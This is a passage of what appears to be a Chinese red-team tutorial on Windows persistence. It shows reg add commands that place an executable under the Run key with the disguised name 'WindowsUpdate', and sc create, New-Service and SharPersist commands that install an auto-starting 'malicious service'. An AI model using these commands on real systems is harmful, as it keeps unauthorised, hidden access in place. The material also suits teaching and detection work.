+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="注册表简介" class="heading-element"><span>注册表简介</span>
+  <a href="#%e6%b3%a8%e5%86%8c%e8%a1%a8%e7%ae%80%e4%bb%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>注册表相当于Windows下的一个庞大的层次性数据库<br>
+基本上有着系统所有的配置信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">注册表是windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着windows的启动、硬件驱动程序的装载以及一些windows应用程序的运行，从而在整个系统中起着核心作用  </span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="注册表组成" class="heading-element"><span>注册表组成</span>
+  <a href="#%e6%b3%a8%e5%86%8c%e8%a1%a8%e7%bb%84%e6%88%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>注册表由</p>
+<ul>
+<li>键(rootkey)(也叫主键或称&quot;项&quot;)</li>
+<li>子键(subkey)(子项)</li>
+<li>值项(value)构成<br>
+一个键就是分支中的一个文件夹，而子键就是这个文件夹中的子文件夹，子键同样也是一个键<br>
+一个值项则是一个键的当前定义，由名称、数据类型以及分配的值组成<br>
+一个键可以有一个或者多个值，每个值的名称各不相同，如果一个值的名称为空，则该值为该键的默认值</li>
+</ul>
+<h3 id="五大根键" class="heading-element"><span>五大根键</span>
+  <a href="#%e4%ba%94%e5%a4%a7%e6%a0%b9%e9%94%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ul>
+<li>HKEY_USERS<br>
+保存了存放在本地计算机口令列表中的用户标识和密码列表</li>
+<li>HKEY_CURRENT_USER<br>
+该根键包含了本地工作站中存放的当前登录的用户信息</li>
+<li>HKEY_CURRENT_CONFIG<br>
+该根键存放着当前用户桌面配置的数据</li>
+<li>HKEY_CLASSES_ROOT<br>
+该根键根据windows操作系统中所安装的应用程序的扩展名，来指定文件类型。</li>
+<li>HKEY_LOCAL_MACHINE<br>
+该根键存在本地计算机的硬件信息</li>
+</ul>
+<h3 id="实现原理" class="heading-element"><span>实现原理</span>
+  <a href="#%e5%ae%9e%e7%8e%b0%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>windows提供了专门的开机自启动注册表，在每次开机完成后，它都会在这个注册表键下遍历键值，以获取键值中的程序路径，并创建进程启动程序。所以，只需要在这个注册表键下添加想要设置启动程序的路径就可以。其中常见的两个路径，分别是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run  
+</span></span><span class="line"><span class="cl">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意：要修改<code>HKEY_LOCAL_MACHINE</code>主键的注册表，这要求具有管理员权限，而修改<code>HKEY_CURRENT_USER</code>主键的注册表，只需要用户默认权限就可以实现。<br>
+<code>HKEY_LOCAL_MACHINE</code>键中的自启动项在windows注册表编辑器中的位置<br>
+<code>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503142209442.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503142209442.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503142209442.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503142209442.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503142209442.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503142209442.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="命令行下的使用" class="heading-element"><span>命令行下的使用</span>
+  <a href="#%e5%91%bd%e4%bb%a4%e8%a1%8c%e4%b8%8b%e7%9a%84%e4%bd%bf%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg add 命令介绍  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">REG ADD KeyName [/v ValueName | /ve] [/t Type] [/s Separator] [/d Data] [/f] [/reg:32 | /reg:64]  
+</span></span><span class="line"><span class="cl">KeyName [\\Machine\]Fullkey  
+</span></span><span class="line"><span class="cl">		Machine 远程机器名 - 忽略默认到当前机器。远程机器上只有HKLM和HKU可用  
+</span></span><span class="line"><span class="cl">		FullKey ROOTKEY\SubKey  
+</span></span><span class="line"><span class="cl">		ROOTKEY [HKLM | HKCU | HKU | HKCC]  
+</span></span><span class="line"><span class="cl">		SubKey  所选ROOTKEY下的注册表项的完整名称  
+</span></span><span class="line"><span class="cl">/v      为注册表项添加空白值名称(默认)  
+</span></span><span class="line"><span class="cl">/ve     为注册表项添加空白值名称(默认)  
+</span></span><span class="line"><span class="cl">/t      RegKey 数据类型  
+</span></span><span class="line"><span class="cl">	    [REG_SZ | REG_MULTI_SZ | REG_EXPAND_SZ | REG_DWORD | REG_QWORD | REG_BINARY | REG_NONE]  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">/s       指定一个在REG_MULTI_SZ数据字符串中用作分隔符的字符  
+</span></span><span class="line"><span class="cl">         如果忽略，则将&#34;\0&#34;用作分隔符  
+</span></span><span class="line"><span class="cl">/d       要分配给添加的注册表 ValueName 的数据  
+</span></span><span class="line"><span class="cl">/f       不用提示就强行覆盖现有注册表项  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>REG ADD KeyName(这里使用FullKey全路径用于区分) /v xxx(所选项之下要添加的值名称 /t REG_SZ(值的类型) /d xxx(值内容) /f</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reg add HKEY_CURRENT_USER<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\R</span>un /v WindowsUpdate /t REG_SZ /d <span class="s2">&#34;C:\Users\f10wers13eicheng\Desktop\artifact.exe&#34;</span> /f  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">reg add HKEY_LOCAL_MACHINE<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\R</span>un /v WindowsUpdate /t REG_SZ /d <span class="s2">&#34;C:\Users\f10wers13eicheng\Desktop\artifact.exe&#34;</span> /f  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>reg query KeyName(FullKey) /f ValueName</code><br>
+<code>reg delete KeyName(FullKey) -v ValueName /f</code></p>
+<h2 id="权限维持-注册服务自启" class="heading-element"><span>权限维持-注册服务自启</span>
+  <a href="#%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81-%e6%b3%a8%e5%86%8c%e6%9c%8d%e5%8a%a1%e8%87%aa%e5%90%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="什么是系统服务" class="heading-element"><span>什么是系统服务</span>
+  <a href="#%e4%bb%80%e4%b9%88%e6%98%af%e7%b3%bb%e7%bb%9f%e6%9c%8d%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>服务是一种应用程序类型，它在后台运行。服务应用程序通常可以在本地和通过网络为用户提供一些功能，例如客户端/服务应用程序、Web服务器、数据库应用服务器以及其他基于服务器的应用程序。<br>
+1、启动系统服务管理器的命令为:<code>services.msc</code><br>
+2、操作系统服务需要本地管理员权限<br>
+3、服务在Windows启动后将以本地系统权限(system)执行</p>
+<h3 id="系统服务的作用" class="heading-element"><span>系统服务的作用</span>
+  <a href="#%e7%b3%bb%e7%bb%9f%e6%9c%8d%e5%8a%a1%e7%9a%84%e4%bd%9c%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>1、启动、停止、暂停、恢复或禁用远程和本地计算机服务<br>
+2、管理本地和远程计算机上的服务<br>
+3、设置服务失败时的故障恢复操作<br>
+4、为特定的硬件配置文件启用或禁用服务<br>
+5、查看每个服务的状态和描述</p>
+<h3 id="命令行下创建服务" class="heading-element"><span>命令行下创建服务</span>
+  <a href="#%e5%91%bd%e4%bb%a4%e8%a1%8c%e4%b8%8b%e5%88%9b%e5%bb%ba%e6%9c%8d%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>如果账户具有本地管理员特权，则可以从命令提示符创建服务，参数&quot;<code>binpath&quot;</code>用于执行任意有效负载，而参数<code>&quot;auto&quot;</code>用于确保恶意服务将自动启动。<br>
+<strong>添加SC服务</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">设置程序路径  
+</span></span><span class="line"><span class="cl">sc create &#34;scAutoRunTest&#34; binpath=&#34;cmd /c start /b C:\Users\Public\scAutoRunTest.exe&#34;  
+</span></span><span class="line"><span class="cl">设置对服务的描述  
+</span></span><span class="line"><span class="cl">sc description &#34;scAutoRunTest&#34; &#34;scAutoRunTest&#34;  
+</span></span><span class="line"><span class="cl">设置这个服务为自启动  
+</span></span><span class="line"><span class="cl">sc config &#34;scAutoRunTest&#34; start=auto  
+</span></span><span class="line"><span class="cl">启动服务  
+</span></span><span class="line"><span class="cl">net start &#34;scAutoRunTest&#34;  
+</span></span><span class="line"><span class="cl">sc start &#34;scAutoRunTest&#34;  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>查询sc服务</strong><br>
+<code>sc qc scAutoRunTest</code><br>
+<strong>删除sc服务</strong><br>
+<code>sc delete scAutoRunTest</code></p>
+<h3 id="powershell创建服务" class="heading-element"><span>PowerShell创建服务</span>
+  <a href="#powershell%e5%88%9b%e5%bb%ba%e6%9c%8d%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">创建服务  
+</span></span><span class="line"><span class="cl">powershell.exe New-Service -Name &#34;scAutoRunTest&#34; -BinaryPathName &#39;cmd /c start /b C:\UserPublic\scAutoRunTest.exe&#39; -Description &#34;scAutoRunTest&#34; -StartupType Automatic  
+</span></span><span class="line"><span class="cl">启动服务  
+</span></span><span class="line"><span class="cl">sc start scAutoRunTest  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>查询sc服务</strong><br>
+<code>powershell.exe Get-Service -DisplayName &quot;scAutoRunTest&quot;</code><br>
+<strong>删除sc服务</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">powershell.exe Remove-Service-name &#34;scAutoRunTest&#34;  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">Remove-Service-name仅在PS v6以上有效  
+</span></span><span class="line"><span class="cl">windows10 、Server 2016、2019内置的是PowerShell5.1  </span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="sharpersist-创建服务" class="heading-element"><span>SharPersist 创建服务</span>
+  <a href="#sharpersist-%e5%88%9b%e5%bb%ba%e6%9c%8d%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Windows persistence toolkit written In C#<br>
+SharpPersist支持在系统中创建新服务的持久性技术，在系统上安装新服务需要本地管理员的访问权限，该服务将在Windows启动后以本地系统执行。<br>
+<strong>添加sc服务</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">execute-assembly /root/SharpPersist.exe -t service -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c C:\Users\Public\scAutoRunTest.exe&#34; -n &#34;scAutoRunTest&#34; -m add  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>查询sc服务</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">execute-assembly /root/SharpPersist.exe -t service -m list -n &#34;scAutoRunTest&#34;  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>删除sc服务</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">execute-assembly /root/SharpPersist.exe -t service -n &#34;scAutoRunTest&#34; -m remove  </span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="权限维持-计划任务" class="heading-element"><span>权限维持-计划任务</span>
+  <a href="#%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81-%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="计划任务简介" class="heading-element"><span>计划任务简介</span>
+  <a href="#%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1%e7%ae%80%e4%bb%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>计划任务是系统的常见功能，利用任务计划功能，可以将任何脚本、程序或文档安排在某个最方便的时间去运行。任务计划在每次系统启动的时候启动并在后台运行。<br>
+当我们需要在服务器上定时执行一些重复性的事件时使用的，可以通过计划任务程序来运行准备好的脚本，批处理文件、程序或命令，以其在某个特定的事件或条件中运行。</p>
+<h3 id="schtasks简介" class="heading-element"><span>schtasks简介</span>
+  <a href="#schtasks%e7%ae%80%e4%bb%8b" class="heading-mark">
